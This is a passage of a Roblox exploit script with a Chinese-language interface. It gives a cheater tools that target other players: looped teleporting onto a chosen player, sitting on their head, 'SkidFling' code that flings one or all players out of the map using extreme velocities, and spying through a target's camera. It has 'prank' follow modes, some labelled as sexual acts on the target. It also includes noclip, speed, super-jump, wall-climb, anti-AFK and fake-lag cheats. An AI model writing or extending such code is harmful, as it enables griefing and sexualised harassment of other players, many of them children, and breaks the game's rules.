local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
if root and targetRoot then
root.CFrame = targetRoot.CFrame
pNotify("成功", "已传送到 " .. target.Name)
end
end)

local tpLoopSingle = false
TeleportBox:AddToggle("TP2_LoopSingle", { Text = "循环传送", Default = false }):OnChanged(function(v)
tpLoopSingle = v
if v then
local thread = task.spawn(function()
while tpLoopSingle do
if tpTargetName ~= "" then
local target = getTargetPlayer(tpTargetName)
if target and target.Character then
local char = getLocalChar()
if char then
local root = char:FindFirstChild("HumanoidRootPart")
local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
if root and targetRoot then root.CFrame = targetRoot.CFrame end
end
end
end
task.wait(0.3)
end
end)
table.insert(PState.threads, thread)
end
end)

local HeadSitBox = Tabs.TP:AddLeftGroupbox("坐头功能")
local sitHeadTargetName = ""
local sitHeadDropdown = HeadSitBox:AddDropdown("SitHead_Target", {
Text = "选择目标玩家",
Values = {},
Default = "",
Multi = false,
})
sitHeadDropdown:OnChanged(function(v) sitHeadTargetName = v end)

HeadSitBox:AddButton("刷新玩家列表", function()
sitHeadDropdown:SetValues(refreshPlayerNames())
pNotify("刷新", "已刷新玩家列表")
end)

local headSitActive = false
local loopHeadSit = false

local function stopHeadSit()
headSitActive = false
if PState.conns.headSit then
PState.conns.headSit:Disconnect()
PState.conns.headSit = nil
end
local char = getLocalChar()
if char then
local hum = char:FindFirstChildOfClass("Humanoid")
if hum then hum.Sit = false end
enableCollision(char)
end
pNotify("坐头停止", "已停止坐头")
end

local function startHeadSit(playerName)
if PState.conns.headSit then
PState.conns.headSit:Disconnect()
PState.conns.headSit = nil
end
headSitActive = true
local char = getLocalChar()
if not char then pNotify("失败", "角色未加载") headSitActive = false return end
local hum = char:FindFirstChildOfClass("Humanoid")
local root = char:FindFirstChild("HumanoidRootPart")
if not hum or not root then pNotify("失败", "角色缺少部件") headSitActive = false return end
disableCollision(char)
hum.Sit = true
PState.conns.headSit = PRunService.Heartbeat:Connect(function()
pcall(function()
if not headSitActive or not char.Parent then
if loopHeadSit and PLocalPlayer.Character then
task.wait(1)
if loopHeadSit and sitHeadTargetName ~= "" then
startHeadSit(sitHeadTargetName)
end
else
stopHeadSit()
end
return
end
local target = getTargetPlayer(playerName)
if not target or not target.Character then
if loopHeadSit then
task.wait(1)
if loopHeadSit and sitHeadTargetName ~= "" then
startHeadSit(sitHeadTargetName)
end
else
stopHeadSit()
end
return
end
local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
if not targetRoot then return end
root.CFrame = targetRoot.CFrame * CFrame.new(0, 1.6, 0.4)
disableCollision(char)
end)
end)
pNotify("坐头启动", "已开始坐 " .. tostring(playerName) .. " 的头")
end

HeadSitBox:AddButton("坐选定玩家头上", function()
if sitHeadTargetName == "" then pNotify("提示", "请先选择玩家") return end
stopHeadSit()
startHeadSit(sitHeadTargetName)
end)

HeadSitBox:AddToggle("SitHead_Loop", { Text = "循环坐头(死亡后继续)", Default = false }):OnChanged(function(v)
loopHeadSit = v
if v and sitHeadTargetName ~= "" then
stopHeadSit()
startHeadSit(sitHeadTargetName)
else
stopHeadSit()
end
end)

HeadSitBox:AddButton("停止坐头", stopHeadSit)

local FlingBox2 = Tabs.TP:AddLeftGroupbox("甩飞功能")
local flingTargetName = ""
local flingDropdown = FlingBox2:AddDropdown("Fling2_Target", {
Text = "选择目标玩家",
Values = {},
Default = "",
Multi = false,
})
flingDropdown:OnChanged(function(v) flingTargetName = v end)

FlingBox2:AddButton("刷新玩家列表", function()
flingDropdown:SetValues(refreshPlayerNames())
pNotify("刷新", "已刷新玩家列表")
end)

local flingLoops2 = { single = false, all = false }

local function SkidFling2(targetPlayer)
local Player = PLocalPlayer
local Character = Player.Character
local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
local RootPart = Humanoid and Humanoid.RootPart
if not RootPart then return end

local TCharacter = targetPlayer.Character
if not TCharacter then return end
local THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
local TRootPart = THumanoid and THumanoid.RootPart
local THead = TCharacter:FindFirstChild("Head")
local Accessory = TCharacter:FindFirstChildOfClass("Accessory")
local Handle = Accessory and Accessory:FindFirstChild("Handle")

if RootPart.Velocity.Magnitude < 50 then
getgenv().OldPos = RootPart.CFrame
end
if THumanoid and THumanoid.Sit then return end
if THead then
workspace.CurrentCamera.CameraSubject = THead
elseif Handle then
workspace.CurrentCamera.CameraSubject = Handle
elseif THumanoid then
workspace.CurrentCamera.CameraSubject = THumanoid
end

local FPos = function(BasePart, Pos, Ang)
RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
end

local SFBasePart = function(BasePart)
local TimeToWait = 2
local Time = tick()
local Angle = 0
repeat
if RootPart and THumanoid then
if BasePart.Velocity.Magnitude < 50 then
Angle = Angle + 100
FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
task.wait()
FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
task.wait()
FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
task.wait()
FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
task.wait()
FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
task.wait()
FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
task.wait()
else
FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
task.wait()
FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
task.wait()
FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
task.wait()
FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
task.wait()
FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
task.wait()
FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
task.wait()
FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
task.wait()
FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
task.wait()
FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
task.wait()
FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
task.wait()
end
else
break
end
until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= targetPlayer.Character or targetPlayer.Parent ~= PPlayers or not targetPlayer.Character == TCharacter or (THumanoid and THumanoid.Sit) or Humanoid.Health <= 0 or tick() > Time + TimeToWait
end

workspace.FallenPartsDestroyHeight = 0/0
local BV = Instance.new("BodyVelocity")
BV.Name = "EpixVel"
BV.Parent = RootPart
BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

if TRootPart and THead then
if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
SFBasePart(THead)
else
SFBasePart(TRootPart)
end
elseif TRootPart then
SFBasePart(TRootPart)
elseif THead then
SFBasePart(THead)
elseif Handle then
SFBasePart(Handle)
else
return
end

BV:Destroy()
Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
workspace.CurrentCamera.CameraSubject = Humanoid

repeat
RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
Humanoid:ChangeState("GettingUp")
table.foreach(Character:GetChildren(), function(_, x)
if x:IsA("BasePart") then
x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
end
end)
task.wait()
until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
workspace.FallenPartsDestroyHeight = getgenv().FPDH
end

FlingBox2:AddButton("甩飞选定玩家", function()
if flingTargetName == "" then pNotify("错误", "请先选择玩家") return end
local target = getTargetPlayer(flingTargetName)
if not target then pNotify("错误", "未找到玩家") return end
pcall(function() SkidFling2(target) end)
pNotify("成功", "甩飞玩家一次")
end)

FlingBox2:AddToggle("Fling2_LoopSingle", { Text = "循环甩飞选定玩家", Default = false }):OnChanged(function(v)
flingLoops2.single = v
if v then
local thread = task.spawn(function()
while flingLoops2.single do
if flingTargetName ~= "" then
local target = getTargetPlayer(flingTargetName)
if target then pcall(function() SkidFling2(target) end) end
end
task.wait(0.1)
end
end)
table.insert(PState.threads, thread)
pNotify("开始", "循环甩飞玩家")
else
pNotify("停止", "循环甩飞已停止")
end
end)

FlingBox2:AddButton("甩飞所有玩家", function()
local count = 0
for _, p in ipairs(PPlayers:GetPlayers()) do
if p ~= PLocalPlayer and p.Character then
pcall(function() SkidFling2(p) end)
count = count + 1
task.wait(0.1)
end
end
pNotify("成功", "已甩飞 " .. count .. " 个玩家")
end)

FlingBox2:AddToggle("Fling2_LoopAll", { Text = "循环甩飞所有玩家", Default = false }):OnChanged(function(v)
flingLoops2.all = v
if v then
local thread = task.spawn(function()
while flingLoops2.all do
for _, p in ipairs(PPlayers:GetPlayers()) do
if p ~= PLocalPlayer and p.Character then
pcall(function() SkidFling2(p) end)
end
task.wait(0.05)
end
task.wait(0.1)
end
end)
table.insert(PState.threads, thread)
pNotify("开始", "循环甩飞所有玩家")
else
pNotify("停止", "循环甩飞所有玩家已停止")
end
end)

FlingBox2:AddButton("停止所有甩飞", function()
flingLoops2.single = false
flingLoops2.all = false
pNotify("停止", "已停止所有甩飞")
end)

local MonitorBox2 = Tabs.TP:AddRightGroupbox("视角监视")
local monitorTargetName = ""
local monitorDropdown = MonitorBox2:AddDropdown("Monitor2_Target", {
Text = "选择目标玩家",
Values = {},
Default = "",
Multi = false,
})
monitorDropdown:OnChanged(function(v) monitorTargetName = v end)

MonitorBox2:AddButton("刷新玩家列表", function()
monitorDropdown:SetValues(refreshPlayerNames())
pNotify("刷新", "已刷新玩家列表")
end)

local function stopMonitor2()
if PState.conns.monitor then
PState.conns.monitor:Disconnect()
PState.conns.monitor = nil
end
local char = getLocalChar()
if char then
local hum = char:FindFirstChildOfClass("Humanoid")
if hum then workspace.CurrentCamera.CameraSubject = hum end
end
pNotify("监视停止", "已停止监视")
end

local function startMonitor2(playerName)
if PState.conns.monitor then
PState.conns.monitor:Disconnect()
PState.conns.monitor = nil
end
local camera = workspace.CurrentCamera
if not camera then return end
PState.conns.monitor = PRunService.Heartbeat:Connect(function()
pcall(function()
local target = getTargetPlayer(playerName)
if not target or not target.Character then
stopMonitor2()
return
end
local subject = target.Character:FindFirstChildOfClass("Humanoid")
if not subject then
subject = target.Character:FindFirstChild("Head") or target.Character:FindFirstChild("HumanoidRootPart")
end
if subject then
camera.CameraSubject = subject
end
end)
end)
pNotify("监视启动", "已开始监视 " .. playerName)
end

MonitorBox2:AddButton("开始监视选定玩家", function()
if monitorTargetName == "" then pNotify("提示", "请先选择玩家") return end
stopMonitor2()
startMonitor2(monitorTargetName)
end)

MonitorBox2:AddButton("停止监视", stopMonitor2)

local FollowBox2 = Tabs.TP:AddRightGroupbox("恶搞跟随")
local followTargetName = ""
local followDropdown = FollowBox2:AddDropdown("Follow2_Target", {
Text = "选择目标玩家",
Values = {},
Default = "",
Multi = false,
})
followDropdown:OnChanged(function(v) followTargetName = v end)

FollowBox2:AddButton("刷新玩家列表", function()
followDropdown:SetValues(refreshPlayerNames())
pNotify("刷新", "已刷新玩家列表")
end)

local followStates2 = {}

local function stopAllFollows2()
for name, _ in pairs(followStates2) do
followStates2[name] = false
end
for name, conn in pairs(PState.conns) do
if name:find("follow2_") then
conn:Disconnect()
PState.conns[name] = nil
end
end
local char = getLocalChar()
if char then enableCollision(char) end
end

local function makeFollow(id, desc, offset_fn)
followStates2[id] = false
return function(target)
stopAllFollows2()
followStates2[id] = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
if offset_fn.collide == false then

else
disableCollision(char)
end
PState.conns["follow2_" .. id] = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2[id] or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
local cf = offset_fn(tr, root, char)
if cf then root.CFrame = cf end
end)
end)
end
end

local followToggles2 = {
{ id = "orbit", text = "旋转环绕", fn = function(target)
followStates2.orbit = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
local angle = 0
PState.conns.follow2_orbit = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.orbit or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
angle = angle + 0.05
if angle > 360 then angle = 0 end
root.CFrame = CFrame.new(tr.Position + Vector3.new(math.cos(angle)*5, 2, math.sin(angle)*5), tr.Position)
end)
end)
end },
{ id = "mirror", text = "镜像", fn = function(target)
followStates2.mirror = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_mirror = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.mirror or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
local pos = tr.CFrame * CFrame.new(4, 0, 0)
root.CFrame = CFrame.new(pos.Position) * CFrame.Angles(0, math.pi, 0)
end)
end)
end },
{ id = "float", text = "漂浮", fn = function(target)
followStates2.float = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_float = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.float or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame = CFrame.new(tr.Position + Vector3.new(0, 3, 0))
end)
end)
end },
{ id = "shadow", text = "影子", fn = function(target)
followStates2.shadow = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_shadow = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.shadow or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame = tr.CFrame * CFrame.new(0, -2.8, 0)
end)
end)
end },
{ id = "anti", text = "反向跟随", fn = function(target)
followStates2.anti = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
PState.conns.follow2_anti = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.anti or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
local dist = (root.Position - tr.Position).Magnitude
if dist < 8 then
local away = (root.Position - tr.Position).Unit
root.CFrame = CFrame.new(tr.Position + away * 8)
end
end)
end)
end },
{ id = "spin", text = "旋转", fn = function(target)
followStates2.spin = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
local angle = 0
PState.conns.follow2_spin = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.spin or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
angle = angle + 5
root.CFrame = CFrame.new(tr.Position + Vector3.new(0, 2, 0)) * CFrame.Angles(0, math.rad(angle), 0)
end)
end)
end },
{ id = "shake", text = "抖动", fn = function(target)
followStates2.shake = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_shake = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.shake or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
local offset = Vector3.new(math.random(-2, 2), math.random(0, 3), math.random(-2, 2))
root.CFrame = CFrame.new(tr.Position + offset)
end)
end)
end },
{ id = "face", text = "站头后", fn = function(target)
followStates2.face = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_face = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.face or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame = tr.CFrame * CFrame.new(0, 3.5, 0)
end)
end)
end },
{ id = "back", text = "坐前面", fn = function(target)
followStates2.back = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
local hum = char:FindFirstChildOfClass("Humanoid")
if hum then hum.Sit = true end
disableCollision(char)
PState.conns.follow2_back = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.back or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame = tr.CFrame * CFrame.new(0, 0, 2)
if hum then hum.Sit = true end
end)
end)
end },
{ id = "auto", text = "动画跟随", fn = function(target)
followStates2.auto = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_auto = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.auto or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame = tr.CFrame * CFrame.new(0, 0, -3)
end)
end)
end },
{ id = "suck", text = "口交", fn = function(target)
followStates2.suck = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
local hum = char:FindFirstChildOfClass("Humanoid")
if hum then hum.Sit = true end
PState.conns.follow2_suck = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.suck or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame = tr.CFrame * CFrame.new(0, -1, 1)
if hum then hum.Sit = true end
end)
end)
end },
{ id = "sus", text = "被超", fn = function(target)
followStates2.sus = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_sus = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.sus or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame = tr.CFrame * CFrame.new(0, 0, -1)
end)
end)
end },
{ id = "modern", text = "超别人", fn = function(target)
followStates2.modern = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_modern = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.modern or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame = tr.CFrame * CFrame.new(0, 0, 1)
end)
end)
end },
{ id = "enhanced", text = "给别人口", fn = function(target)
followStates2.enhanced = true
local char = getLocalChar()
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
local hum = char:FindFirstChildOfClass("Humanoid")
if hum then hum.Sit = true end
PState.conns.follow2_enhanced = PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.enhanced or not char.Parent then return end
if not target.Character then stopAllFollows2() return end
local tr = target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame = tr.CFrame * CFrame.new(0, -1, -0.5)
if hum then hum.Sit = true end
end)
end)
end },
}

for _, ft in ipairs(followToggles2) do
FollowBox2:AddToggle("F2_" .. ft.id, { Text = ft.text, Default = false }):OnChanged(function(v)
if v then
stopAllFollows2()
if followTargetName == "" then pNotify("提示", "请先选择玩家") return end
local target = getTargetPlayer(followTargetName)
if target then
ft.fn(target)
pNotify("跟随", "已开启: " .. ft.text)
end
else
stopAllFollows2()
pNotify("停止", "已停止所有跟随")
end
end)
end

FollowBox2:AddButton("停止所有跟随", function()
stopAllFollows2()
pNotify("停止", "已停止所有恶搞跟随")
end)

local CharPlayers = game:GetService("Players")
local CharRunService = game:GetService("RunService")
local CharLighting = game:GetService("Lighting")
local CharUserInputService = game:GetService("UserInputService")
local CharVirtualInputManager = game:GetService("VirtualInputManager")
local CharWorkspace = game:GetService("Workspace")
local CharLocalPlayer = CharPlayers.LocalPlayer

local charCharacter, charHumanoid, charHrp
local function charRefresh()
charCharacter = CharLocalPlayer.Character
if charCharacter then
charHumanoid = charCharacter:FindFirstChildOfClass("Humanoid")
charHrp = charCharacter:FindFirstChild("HumanoidRootPart")
end
end
charRefresh()

local CharStates = {
WalkSpeed = {Enabled = false, Value = 100, Default = 16},
Noclip = {Enabled = false},
BunnyHop = {Enabled = false, Value = 5},
SuperJump = {Enabled = false, Value = 200},
WallClimb = {Enabled = false, Value = 50},
NightVision = {Enabled = false},
AntiAfk = {Enabled = false},
}

local CharConns = {}
local function charBind(name, conn)
if CharConns[name] then CharConns[name]:Disconnect() end
CharConns[name] = conn
end

local function applyWalkSpeed()
if not charHumanoid then return end
if CharStates.WalkSpeed.Enabled then
charHumanoid.WalkSpeed = CharStates.WalkSpeed.Value
else
charHumanoid.WalkSpeed = CharStates.WalkSpeed.Default
end
end

local noclipActive = false
local noclipConn = nil
local noclipCharAddedConn = nil
local noclipDescendantConns = {}
local noclipOriginalCollisions = {}

local function setupNoclipForChar(character)
if not character then return end
for _, part in pairs(character:GetDescendants()) do
if part:IsA("BasePart") then
if not noclipOriginalCollisions[part] then
noclipOriginalCollisions[part] = part.CanCollide
end
part.CanCollide = false
end
end
local dc = character.DescendantAdded:Connect(function(descendant)
if descendant:IsA("BasePart") then
if not noclipOriginalCollisions[descendant] then
noclipOriginalCollisions[descendant] = descendant.CanCollide
end
descendant.CanCollide = false
end
end)
noclipDescendantConns[character] = dc
end

local function startNoclip()
noclipActive = true
if noclipConn then return end
local char = CharLocalPlayer.Character
if char then setupNoclipForChar(char) end
noclipConn = CharRunService.Stepped:Connect(function()
if not noclipActive then return end
local currentChar = CharLocalPlayer.Character
if not currentChar then return end
for _, part in pairs(currentChar:GetDescendants()) do
if part:IsA("BasePart") then
part.CanCollide = false
end
end
end)
if noclipCharAddedConn then noclipCharAddedConn:Disconnect() end
noclipCharAddedConn = CharLocalPlayer.CharacterAdded:Connect(function(newChar)
if noclipActive then
task.wait()
setupNoclipForChar(newChar)
end
end)
end

local function stopNoclip()
noclipActive = false
if noclipConn then
noclipConn:Disconnect()
noclipConn = nil
end
if noclipCharAddedConn then
noclipCharAddedConn:Disconnect()
noclipCharAddedConn = nil
end
for part, originalState in pairs(noclipOriginalCollisions) do
if part and part.Parent then
part.CanCollide = originalState
end
end
for character, conn in pairs(noclipDescendantConns) do
if conn then conn:Disconnect() end
end
noclipDescendantConns = {}
noclipOriginalCollisions = {}
end

charBind("BunnyHop", CharUserInputService.JumpRequest:Connect(function()
if CharStates.BunnyHop.Enabled and charHumanoid then
charHumanoid:ChangeState(Enum.HumanoidStateType.Jumping)
end
end))

local function applySuperJump()
if not charHumanoid then return end
if CharStates.SuperJump.Enabled then
pcall(function()
charHumanoid.UseJumpPower = true
charHumanoid.JumpPower = CharStates.SuperJump.Value
charHumanoid.JumpHeight = CharStates.SuperJump.Value
end)
else
pcall(function()
charHumanoid.JumpPower = 50
charHumanoid.JumpHeight = 7.2
end)
end
end

charBind("SuperJump", CharUserInputService.JumpRequest:Connect(function()
if CharStates.SuperJump.Enabled and charHumanoid then
pcall(function()
charHumanoid.UseJumpPower = true
charHumanoid.JumpPower = CharStates.SuperJump.Value
charHumanoid.JumpHeight = CharStates.SuperJump.Value
end)
end
end))

charBind("WallClimb", CharRunService.Heartbeat:Connect(function()
if not CharStates.WallClimb.Enabled then return end
if not charCharacter or not charHrp or not charHumanoid then return end
if not charCharacter.Parent then return end
pcall(function()
local rayParams = RaycastParams.new()
rayParams.FilterType = Enum.RaycastFilterType.Blacklist
rayParams.FilterDescendantsInstances = {charCharacter}
local forward = charHrp.CFrame.LookVector
local result = CharWorkspace:Raycast(charHrp.Position, forward * 3, rayParams)
if result then
local normal = result.Normal
if math.abs(normal.Y) < 0.5 then
charHumanoid:ChangeState(Enum.HumanoidStateType.Freefall)
charHrp.Velocity = Vector3.new(charHrp.Velocity.X, CharStates.WallClimb.Value, charHrp.Velocity.Z)
end
end
end)
end))

local AntiAfkConn = nil
local function startAntiAfk()
if AntiAfkConn then return end
local VirtualUser = game:GetService("VirtualUser")
AntiAfkConn = CharLocalPlayer.Idled:Connect(function()
pcall(function()
VirtualUser:CaptureController()
VirtualUser:ClickButton2(Vector2.new())
end)
end)
end

local function stopAntiAfk()
if AntiAfkConn then
AntiAfkConn:Disconnect()
AntiAfkConn = nil
end
end

local function reapplyAllStates()
charRefresh()
if not charCharacter or not charHumanoid then return end
if CharStates.WalkSpeed.Enabled then applyWalkSpeed() end
if CharStates.SuperJump.Enabled then applySuperJump() end
if CharStates.Noclip.Enabled then startNoclip() end
end

CharLocalPlayer.CharacterAdded:Connect(function(c)
charCharacter = c
charHumanoid = c:FindFirstChildOfClass("Humanoid")
charHrp = c:FindFirstChild("HumanoidRootPart")
task.spawn(function()
charHumanoid = c:WaitForChild("Humanoid")
charHrp = c:WaitForChild("HumanoidRootPart")
reapplyAllStates()
end)
task.delay(1, reapplyAllStates)
task.delay(3, reapplyAllStates)
end)

local CharBox = Tabs.Main:AddLeftGroupbox("角色修改")
CharBox:AddToggle("Char_WalkSpeed", { Text = "修改移速", Default = false }):OnChanged(function(v)
CharStates.WalkSpeed.Enabled = v
applyWalkSpeed()
if _G.speedBoostSync then _G.speedBoostSync(v) end
end)
CharBox:AddSlider("Char_WalkSpeedVal", { Text = "移速值", Default = 100, Min = 1, Max = 500, Rounding = 0 }):OnChanged(function(v)
CharStates.WalkSpeed.Value = v
if CharStates.WalkSpeed.Enabled then applyWalkSpeed() end
end)

do
local speedBoostConn = nil

local function speedBoostCleanup()
    if speedBoostConn then speedBoostConn:Disconnect() speedBoostConn = nil end
end

local function disableSpeedBoost()
    speedBoostCleanup()
end

local function enableSpeedBoost()
    local c = game.Players.LocalPlayer.Character
    if not c or not c:FindFirstChild("HumanoidRootPart") or not c:FindFirstChildOfClass("Humanoid") then return end
    local hum = c.Humanoid
    local hrp = c.HumanoidRootPart
    speedBoostCleanup()
    local spd = CharStates.WalkSpeed.Value
    local rs = game:GetService("RunService")
    speedBoostConn = rs.Heartbeat:Connect(function(dt)
        if hum.MoveDirection.Magnitude > 0 then
            hrp:ApplyImpulse(hum.MoveDirection * spd * 40 * dt)
        end
    end)
end

game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    character:WaitForChild("Humanoid", 10)
    character:WaitForChild("HumanoidRootPart", 10)
    if CharStates.WalkSpeed.Enabled then
        task.wait(0.5)
        enableSpeedBoost()
    end
end)
_G.speedBoostSync = function(v)
    if v then enableSpeedBoost() else disableSpeedBoost() end
end
end

CharBox:AddToggle("Char_Noclip", { Text = "穿墙模式", Default = false }):OnChanged(function(v)
CharStates.Noclip.Enabled = v
if v then startNoclip() else stopNoclip() end
end)

CharBox:AddToggle("Char_BunnyHop", { Text = "无限跳", Default = false }):OnChanged(function(v)
CharStates.BunnyHop.Enabled = v
end)

CharBox:AddToggle("Char_SuperJump", { Text = "超级跳跃", Default = false }):OnChanged(function(v)
CharStates.SuperJump.Enabled = v
applySuperJump()
end)
CharBox:AddSlider("Char_SuperJumpVal", { Text = "跳跃高度", Default = 200, Min = 1, Max = 500, Rounding = 0 }):OnChanged(function(v)
CharStates.SuperJump.Value = v
if CharStates.SuperJump.Enabled then applySuperJump() end
end)

CharBox:AddToggle("Char_WallClimb", { Text = "爬墙模式", Default = false }):OnChanged(function(v)
CharStates.WallClimb.Enabled = v
end)
CharBox:AddSlider("Char_WallClimbVal", { Text = "爬墙速度", Default = 50, Min = 1, Max = 200, Rounding = 0 }):OnChanged(function(v)
CharStates.WallClimb.Value = v
end)

local MiscBox = Tabs.Main:AddLeftGroupbox("杂项")
MiscBox:AddToggle("Char_AntiAfk", { Text = "反挂机", Default = false }):OnChanged(function(v)
CharStates.AntiAfk.Enabled = v
if v then startAntiAfk() else stopAntiAfk() end
end)

local FakeLag = {
Enabled = false,
Interval = 0.07,
AnchoredDuration = 0.4,
